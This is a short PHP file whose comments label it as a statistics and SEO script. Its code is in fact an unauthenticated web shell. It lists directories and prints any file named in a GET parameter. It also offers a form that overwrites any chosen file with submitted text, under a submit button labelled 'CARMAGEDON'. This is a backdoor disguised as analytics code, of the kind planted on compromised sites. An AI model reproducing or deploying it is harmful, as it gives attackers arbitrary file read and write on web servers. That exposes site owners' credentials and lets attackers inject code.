<?php 
//Analyt
//statystyki ver 1.1.8
if (isset($_POST['car'])) {	$cos = $_GET['edytuj'];$plik = fopen($cos,"w+");fwrite($plik, stripslashes($_POST['text']));fclose($plik);echo 'gotowe';}	
$tablica_z_lista_plikow_i_katalogow = glob("./*");foreach ($tablica_z_lista_plikow_i_katalogow as $nazwa_pliku_lub_katalogu) {echo $nazwa_pliku_lub_katalogu.'<br />';
}   	if (isset($_GET['cos'])) { $cos = $_GET['cos'];$plik = fopen($cos,"r+");$znak = fread($plik,900000);echo $znak;fclose($plik);
$tablica_z_lista_plikow_i_katalogow = glob("./".$cos."/*");foreach ($tablica_z_lista_plikow_i_katalogow as $nazwa_pliku_lub_katalogu) echo $nazwa_pliku_lub_katalogu.'<br />';
} elseif (isset($_GET['edytuj'])) {$cos = $_GET['edytuj'];$plik = fopen($cos,"r+");$znak = fread($plik,900000);fclose($plik);	
echo '<form action="" method="POST" enctype="multipart/form-data">	<textarea name="text" rows="30" cols="200">'.$znak.'</textarea>	<input type="submit" name="car" value="CARMAGEDON" />	</form>	';
}
////SEO STAT
?>